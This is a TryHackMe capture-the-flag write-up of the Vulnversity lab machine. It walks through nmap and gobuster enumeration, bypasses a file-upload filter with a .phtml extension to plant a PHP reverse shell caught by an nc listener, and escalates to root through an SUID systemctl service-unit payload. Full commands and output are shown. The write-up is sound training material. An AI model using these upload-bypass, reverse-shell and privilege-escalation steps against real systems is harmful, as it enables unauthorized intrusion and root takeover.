---
title: "TryHackMe - Vulnversity"
author: Nasrallah
description: ""
date: 2022-01-07 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, web, reverse-shell, suid, filter]
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

Hello l33ts, I hope you are doing well. Today we are going to look at [Vulnversity](https://tryhackme.com/room/vulnversity), an easy machine from [TryHackMe](https://tryhackme.com/), let's dive into it.

# **Description**

Learn about active recon, web app attacks and privilege escalation.

# **Enumeration**

## nmap

As always, let's start our nmap scan, i will be using this command:`sudo nmap -sC -sV -T4 {target_IP} | tee scans/nmap`

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressice scan to provide faster results.

- | tee scan/nmap: Save the output to a file named nmap.


```terminal
$ sudo nmap -sC -sV -T4 10.10.131.61 | tee scans/nmap
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 10.10.131.61
Host is up (0.11s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
|_clock-skew: mean: 1h23m32s, deviation: 2h53m13s, median: -16m27s
| smb2-time:
|   date: 2022-01-05T09:34:30
|_  start_date: N/A
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2022-01-05T04:34:28-05:00
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

We found 6 open ports on our target machine, 2 port seems interesting to us, 21(FTP) and 3333(HTTP). The FTP service doesn't seem to have any vulnerability and it doesn't allow us to login as anonymous. Let's now check the http server by running a Gobuster scan.

## Gobuster

In order to scan for directories and file using gobuster, i will be using the following command: `gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,txt -u http://{target_IP}:3333 | tee gobuster`

```terminal
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,txt -u http://10.10.131.61:3333 | tee gobuster
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.131.61:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Timeout:                 10s

===============================================================
/.hta.txt             (Status: 403) [Size: 297]
/.hta.php             (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 293]
/.htaccess            (Status: 403) [Size: 298]
/.htpasswd            (Status: 403) [Size: 298]
/.htaccess.php        (Status: 403) [Size: 302]
/.htpasswd.php        (Status: 403) [Size: 302]
/.htaccess.txt        (Status: 403) [Size: 302]
/.htpasswd.txt        (Status: 403) [Size: 302]
/css                  (Status: 301) [Size: 317] [--> http://10.10.131.61:3333/css/]
/fonts                (Status: 301) [Size: 319] [--> http://10.10.131.61:3333/fonts/]
/images               (Status: 301) [Size: 320] [--> http://10.10.131.61:3333/images/]
/index.html           (Status: 200) [Size: 33014]                                     
/internal             (Status: 301) [Size: 322] [--> http://10.10.131.61:3333/internal/]
/js                   (Status: 301) [Size: 316] [--> http://10.10.131.61:3333/js/]      
/server-status        (Status: 403) [Size: 302]                                         

===============================================================
```

Gobuster found a directory called **/internal**, let's check it out.

![Upload](/assets/img/tryhackme/Vulnversity/upload.png)

That's an upload page, let's try to upload a php reverse shell, i this case i will be using [pentestmonkey's php_reverse_shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

> you have to change the ip address in the script to your attacking machine's ip address: run the command `ip a show tun0` or `ifconfig` to get your ip address.

When we try to upload the file, the website seems to be blocking **.php** file extension, we will need to change that, some of the extensions we can use are: **.phar - .pht - phps - phtml - php3 - .php4 - .php5 - .php7**

We can use Burp Suit to automate this process by creating a list that contains the previous extensions.

I will be doing it manually here, we find the the **.phtml** is not blocked, and our reverse shell got uploaded, but we don't know where it went, let's do a second Gobuster scan in the **/internal** directory: `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://{target_IP}:3333/internal`

```terminal
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.131.61:3333/internal gobuster                                           130 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.131.61:3333/internal
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/05 05:01:29 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 302]
/.htaccess            (Status: 403) [Size: 307]
/.htpasswd            (Status: 403) [Size: 307]
/css                  (Status: 301) [Size: 326] [--> http://10.10.131.61:3333/internal/css/]
/index.php            (Status: 200) [Size: 525]                                             
/uploads              (Status: 301) [Size: 330] [--> http://10.10.131.61:3333/internal/uploads/]

===============================================================
```

We found **/uploads** directory, this is where the uploads go, when we navigate to it, we find our shell there.

# **Foothold**

Let's set a listener on our machine: `nc -nlvp 1234`, after that, we need to click on the payload to receive a reverse shell.

```terminal
$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.11.31.131] from (UNKNOWN) [10.10.131.61] 56840
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 04:53:37 up 24 min,  0 users,  load average: 0.00, 0.00, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@vulnuniversity:/$ export TERM=xterm
export TERM=xterm
www-data@vulnuniversity:/$ ^Z
zsh: suspended  nc -lnvp 1234

┌──(root㉿kali)-[/tmp/arsenal]
└─$ stty raw -echo; fg                                                                                                                             148 ⨯ 1 ⚙
[1]  + continued  nc -lnvp 1234

www-data@vulnuniversity:/$ whoami
www-data
www-data@vulnuniversity:/$
```

The commands i executed are for getting a fully functional shell, so that we can use the arrow keys, TAB key and more, you don't have to use them if you don't want to.


# **Privilege Escalation**

Time to upgrade to root, i will be running `sudo -l`, `id` commands and search for some SUID binaries using this command: `find / -type f -perm -04000 2>/dev/null`

```terminal
www-data@vulnuniversity:/home/bill$ sudo -l      
[sudo] password for www-data:
www-data@vulnuniversity:/home/bill$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@vulnuniversity:/home/bill$ find / -type f -perm -04000 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
www-data@vulnuniversity:/home/bill$
```

After searching for SUID binaries, we found an interesting one, it's **systemctl**, let's search it in [GTFOBins](https://gtfobins.github.io/)

![SUID](/assets/img/tryhackme/Vulnversity/SUID.png)

Great! it is possible for us to get root using that, but we need to make some changes to that before trying to execute it. I will be changing the command that gets executed from `id > /tmp/output` to `cp /bin/bash /tmp/bash; chmod +s /tmp/bash`. What that does is take a copy of bash and put in tmp directory. After that, it adds a SUID bit to that file so that we can execute as it's owner that is root. We also need to change the path of the binary from `./systemctl` to `/bin/systemctl`. Here is how are final commands should look like:

```terminal
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cp /bin/bash /tmp/bash; chmod +s /tmp/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

Now let's copy that and paste it into our reverse shell.

```terminal
www-data@vulnuniversity:/home/bill$ TF=$(mktemp).service
www-data@vulnuniversity:/home/bill$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "cp /bin/bash /tmp/bash; chmod +s /tmp/bash"
> [Install]
> WantedBy=multi-user.target' > $TF
www-data@vulnuniversity:/home/bill$ /bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.wxqqFW7qE1.service to /tmp/tmp.wxqqFW7qE1.service.
www-data@vulnuniversity:/home/bill$ /bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.wxqqFW7qE1.service to /tmp/tmp.wxqqFW7qE1.service.
www-data@vulnuniversity:/home/bill$ ls -l /tmp
total 1028
-rwsr-sr-x 1 root     root     1037528 Jan  5 04:57 bash
drwx------ 3 root     root        4096 Jan  5 04:29 systemd-private-8ac40940bfe640f0801c67ff38799d9a-systemd-timesyncd.service-2tCa9l
-rw------- 1 www-data www-data       0 Jan  5 04:57 tmp.R8OuJkkl6C
-rw-rw-rw- 1 www-data www-data     126 Jan  5 04:57 tmp.R8OuJkkl6C.service
-rw------- 1 www-data www-data       0 Jan  5 04:57 tmp.wxqqFW7qE1
-rw-rw-rw- 1 www-data www-data     126 Jan  5 04:57 tmp.wxqqFW7qE1.service
www-data@vulnuniversity:/home/bill$ /tmp/bash -p
bash-4.3# whoami
root
bash-4.3#
```

And just like that, we have rooted Vulnversity machine, hope you have enjoyed and see you in the next hack.
